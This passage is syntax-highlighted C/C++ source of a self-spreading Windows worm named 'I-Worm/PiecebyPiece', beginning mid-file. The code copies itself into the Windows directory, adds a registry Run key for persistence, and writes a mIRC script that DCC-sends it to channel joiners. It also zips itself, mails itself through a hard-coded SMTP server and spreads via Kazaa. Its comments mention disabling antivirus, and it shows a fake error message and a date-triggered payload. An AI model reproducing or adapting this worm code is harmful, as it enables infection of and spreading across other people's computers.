</span><span class="sc11">itoa</span><span class="sc10">(</span><span class="sc11">rand</span><span class="sc10">(),</span><span class="sc11">rnd</span><span class="sc10">,</span><span class="sc4">10</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">winbkup</span><span class="sc10">,</span><span class="sc11">rnd</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">winbkup</span><span class="sc10">,</span><span class="sc6">".exe"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc2">//Copy file to Windows
</span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">,</span><span class="sc11">winbkup</span><span class="sc10">,</span><span class="sc11">TRUE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc2">//Just in case there is no WinZip, use this path
</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">zippth</span><span class="sc10">,</span><span class="sc11">winbkup</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc2">//Now make Windows run it at startup
</span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">winbkup</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">val</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc11">winbkup</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">val</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">RegCreateKey</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span><span class="sc10">,&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc6">"Windows task32 sys"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc11">val</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">val</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//--------------------------------------MIRC--------------------------------------------------
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">mirc</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">//Creates a mIRC script
</span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hKey</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">mircpth</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">mirc</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">mircpthlen</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">mircpth</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc2">//Get the path from our friend: the registry :)
</span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\mIRC"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_QUERY_VALUE</span><span class="sc10">,&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegQueryValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc6">"UninstallString"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">mircpth</span><span class="sc10">,&amp;</span><span class="sc11">mircpthlen</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mircpth</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]!=</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">mircpth</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]!=</span><span class="sc7">'.'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">mirc</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">]=</span><span class="sc11">mircpth</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">mirc</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">mirc</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mirc</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]!=</span><span class="sc4">92</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">mirc</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">i</span><span class="sc10">--;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">mirc</span><span class="sc10">,</span><span class="sc6">"script.ini"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc2">//Write a new script.ini
</span><span class="sc11">fstream</span><span class="sc0"> </span><span class="sc11">f</span><span class="sc10">(</span><span class="sc11">mirc</span><span class="sc10">,</span><span class="sc11">ios</span><span class="sc10">::</span><span class="sc11">out</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">f</span><span class="sc10">&lt;&lt;</span><span class="sc6">"[Script]"</span><span class="sc10">&lt;&lt;</span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">f</span><span class="sc10">&lt;&lt;</span><span class="sc6">"n0=ON 1:JOIN:#:{"</span><span class="sc10">&lt;&lt;</span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">f</span><span class="sc10">&lt;&lt;</span><span class="sc6">"n1=/dcc send $nick "</span><span class="sc10">&lt;&lt;</span><span class="sc11">zippth</span><span class="sc10">&lt;&lt;</span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">f</span><span class="sc10">&lt;&lt;</span><span class="sc6">"n2=}"</span><span class="sc10">&lt;&lt;</span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">f</span><span class="sc10">&lt;&lt;</span><span class="sc6">"n3=on 1:start:{"</span><span class="sc10">&lt;&lt;</span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">f</span><span class="sc10">&lt;&lt;</span><span class="sc6">"n4= /join #piecebypiece"</span><span class="sc10">&lt;&lt;</span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">f</span><span class="sc10">&lt;&lt;</span><span class="sc6">"n5=}"</span><span class="sc10">&lt;&lt;</span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">f</span><span class="sc10">.</span><span class="sc11">close</span><span class="sc10">();</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//--------------------------------------ZIPIT-------------------------------------------------
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">zipit</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">file</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">//Zips the virus with a random name
</span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hKey</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">zip</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">zippath</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">],</span><span class="sc11">param</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">],</span><span class="sc11">rnd</span><span class="sc10">[</span><span class="sc4">6</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">ziplen</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">zip</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc2">//Get the path from the registry
</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\winzip32.exe"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_QUERY_VALUE</span><span class="sc10">,&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">==</span><span class="sc11">ERROR_SUCCESS</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">//If WinZip is installed then zip the file
</span><span class="sc11">RegQueryValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc6">""</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">zip</span><span class="sc10">,&amp;</span><span class="sc11">ziplen</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">zip</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">zippath</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc11">zip</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">zippath</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc2">//Make a random filename for the .zip file
</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">zippth</span><span class="sc10">,</span><span class="sc11">windir</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">zippth</span><span class="sc10">,</span><span class="sc6">"\\System\\win32sys"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">GetSystemTime</span><span class="sc10">(&amp;</span><span class="sc11">time</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">srand</span><span class="sc10">(</span><span class="sc11">time</span><span class="sc10">.</span><span class="sc11">wSecond</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">itoa</span><span class="sc10">(</span><span class="sc11">rand</span><span class="sc10">(),</span><span class="sc11">rnd</span><span class="sc10">,</span><span class="sc4">10</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">zippth</span><span class="sc10">,</span><span class="sc11">rnd</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">zippth</span><span class="sc10">,</span><span class="sc6">".zip"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc2">//Zip it!
</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">param</span><span class="sc10">,</span><span class="sc6">" -a -r "</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">param</span><span class="sc10">,</span><span class="sc11">zippth</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">param</span><span class="sc10">,</span><span class="sc6">" "</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">param</span><span class="sc10">,</span><span class="sc11">file</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ShellExecute</span><span class="sc10">(</span><span class="sc11">hwnd</span><span class="sc10">,</span><span class="sc6">"open"</span><span class="sc10">,</span><span class="sc11">zippath</span><span class="sc10">,</span><span class="sc11">param</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">SW_HIDE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">zippth</span><span class="sc10">,</span><span class="sc11">file</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">//Else just use the executable file for mIRC
</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//--------------------------------------TIMERPROC---------------------------------------------
</span><span class="sc0">
</span><span class="sc11">VOID</span><span class="sc0"> </span><span class="sc11">CALLBACK</span><span class="sc0"> </span><span class="sc11">TimerProc</span><span class="sc10">(</span><span class="sc11">HWND</span><span class="sc0"> </span><span class="sc11">hwnd</span><span class="sc10">,</span><span class="sc11">UINT</span><span class="sc0"> </span><span class="sc11">uMsg</span><span class="sc10">,</span><span class="sc11">UINT</span><span class="sc0"> </span><span class="sc11">idEvent</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwTime</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sending</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">//Check for a connection if a mail is not under delivery
</span><span class="sc0">    </span><span class="sc11">conect</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">err</span><span class="sc10">!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">//if the server used encountered an error, try using the hard-coded serv.
</span><span class="sc0">        </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">server</span><span class="sc10">,</span><span class="sc6">"smtp.barrysworld.com"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">email</span><span class="sc10">,</span><span class="sc6">"john@barrysworld.com"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">helo</span><span class="sc10">,</span><span class="sc6">"barrysworld.com"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">conect</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connected</span><span class="sc10">==</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">KillTimer</span><span class="sc10">(</span><span class="sc11">hwnd</span><span class="sc10">,</span><span class="sc11">tim</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">//Don't need to check for it again, but keep resident
</span><span class="sc0">    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//--------------------------------------PAYLOAD-----------------------------------------------
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">payload</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">//Every virus MUST have a payload ;)
</span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc6">"\"Cause nothing ever lasts forever\nWe're like flowers in this vase, together\nYou and me, it's pulling me down\nTearing my down, piece by piece\nAnd you can't see\nThat's it's like a disease\nKilling me now, it's so hard to breathe\"\n\t-Feeder &lt;Piece by Piece&gt;"</span><span class="sc10">,</span><span class="sc6">"I-Worm/PiecebyPiece"</span><span class="sc10">,</span><span class="sc11">MB_OK</span><span class="sc10">+</span><span class="sc11">MB_SYSTEMMODAL</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//--------------------------------------------------------------------------------------------
//Main function
//--------------------------------------------------------------------------------------------
</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">WinMain</span><span class="sc10">(</span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hInstance</span><span class="sc10">,</span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hPrevInst</span><span class="sc10">,</span><span class="sc11">LPSTR</span><span class="sc0"> </span><span class="sc11">lpCmdLine</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nShowCmd</span><span class="sc10">){</span><span class="sc0">
</span><span class="sc11">WNDCLASSEX</span><span class="sc0"> </span><span class="sc11">wndc</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">MSG</span><span class="sc0"> </span><span class="sc11">msg</span><span class="sc10">;</span><span class="sc0">    
</span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hKey</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">],</span><span class="sc11">inf</span><span class="sc10">[]=</span><span class="sc6">"yes"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">buflen</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">first</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc2">//Create a window
</span><span class="sc11">wndc</span><span class="sc10">.</span><span class="sc11">cbClsExtra</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">wndc</span><span class="sc10">.</span><span class="sc11">cbSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">wndc</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">wndc</span><span class="sc10">.</span><span class="sc11">cbWndExtra</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">wndc</span><span class="sc10">.</span><span class="sc11">hbrBackground</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HBRUSH</span><span class="sc10">)</span><span class="sc11">GetStockObject</span><span class="sc10">(</span><span class="sc11">BLACK_BRUSH</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">wndc</span><span class="sc10">.</span><span class="sc11">hCursor</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">LoadCursor</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">IDC_ARROW</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">wndc</span><span class="sc10">.</span><span class="sc11">hIcon</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">LoadIcon</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">IDI_APPLICATION</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">wndc</span><span class="sc10">.</span><span class="sc11">hIconSm</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">LoadIcon</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">IDI_APPLICATION</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">wndc</span><span class="sc10">.</span><span class="sc11">hInstance</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">hInstance</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">wndc</span><span class="sc10">.</span><span class="sc11">lpfnWndProc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">WndProc</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">wndc</span><span class="sc10">.</span><span class="sc11">lpszClassName</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"ClassName"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">wndc</span><span class="sc10">.</span><span class="sc11">lpszMenuName</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">wndc</span><span class="sc10">.</span><span class="sc11">style</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CS_HREDRAW</span><span class="sc10">|</span><span class="sc11">CS_VREDRAW</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">RegisterClassEx</span><span class="sc10">(&amp;</span><span class="sc11">wndc</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">hwnd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc11">CreateWindow</span><span class="sc10">(</span><span class="sc6">"ClassName"</span><span class="sc10">,</span><span class="sc6">"NEWWIN"</span><span class="sc10">,</span><span class="sc11">WS_POPUPWINDOW</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">1024</span><span class="sc10">,</span><span class="sc4">1024</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">hInstance</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">UpdateWindow</span><span class="sc10">(</span><span class="sc11">hwnd</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc2">//Hide the window
</span><span class="sc11">ShowWindow</span><span class="sc10">(</span><span class="sc11">hwnd</span><span class="sc10">,</span><span class="sc11">SW_HIDE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc2">//Get the filename and disable (if possible) any AVs
</span><span class="sc11">GetWindowThreadProcessId</span><span class="sc10">(</span><span class="sc11">hwnd</span><span class="sc10">,&amp;</span><span class="sc11">ProcessId</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">processes</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc11">GetWindowsDirectory</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">windir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">windir</span><span class="sc10">));</span><span class="sc0"> </span><span class="sc2">//Get the Windir
//Check if the comp. was infected before
</span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc6">"Software\\RedCell"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_QUERY_VALUE</span><span class="sc10">,&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegQueryValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc6">"infected"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">buf</span><span class="sc10">,&amp;</span><span class="sc11">buflen</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]!=</span><span class="sc7">'y'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]!=</span><span class="sc7">'e'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]!=</span><span class="sc7">'s'</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">RegCreateKey</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc6">"Software\\RedCell"</span><span class="sc10">,&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc2">//Create a key in the registry to mark the PC as infected
</span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc6">"infected"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc11">inf</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">inf</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc2">//----INFECT COMPUTER----
</span><span class="sc11">infectwin</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">kazaa</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">zipit</span><span class="sc10">(</span><span class="sc11">winbkup</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">mirc</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc11">base64</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">conect</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc11">first</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc11">hwnd</span><span class="sc10">,</span><span class="sc6">"This program has performed an illegal operation"</span><span class="sc10">,</span><span class="sc6">"Error"</span><span class="sc10">,</span><span class="sc11">MB_OK</span><span class="sc10">+</span><span class="sc11">MB_ICONSTOP</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">base64</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">GetSystemTime</span><span class="sc10">(&amp;</span><span class="sc11">time</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">time</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc10">==</span><span class="sc4">15</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">time</span><span class="sc10">.</span><span class="sc11">wMonth</span><span class="sc10">==</span><span class="sc4">9</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">payload</span><span class="sc10">();</span><span class="sc0"> </span><span class="sc2">//Activate payload when school starts (15 sept. in Romania)
